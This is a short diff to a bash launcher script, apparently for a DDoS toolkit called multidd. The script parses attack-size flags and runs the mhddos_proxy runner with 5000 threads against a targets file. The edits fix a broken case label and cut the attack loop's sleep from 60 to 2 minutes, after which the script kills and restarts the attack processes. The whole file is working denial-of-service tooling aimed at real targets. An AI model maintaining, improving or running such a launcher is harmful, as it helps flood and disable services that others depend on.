@@ -115,7 +115,7 @@ while [ "$1" != "" ]; do
         --XL ) export ddos_size="XL"; shift ;;
         --XXL  | --2XL) export ddos_size="XXL"; shift ;;
         --XXXL | --3XL) export ddos_size="XXXL"; shift ;;
-        --new export mode="new"; shift ;;
+        --new ) export mode="new"; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -178,7 +178,7 @@ else
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
 fi
-sleep 60m
+sleep 2m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 rm -rf ~/multidd/mhddos_proxy/
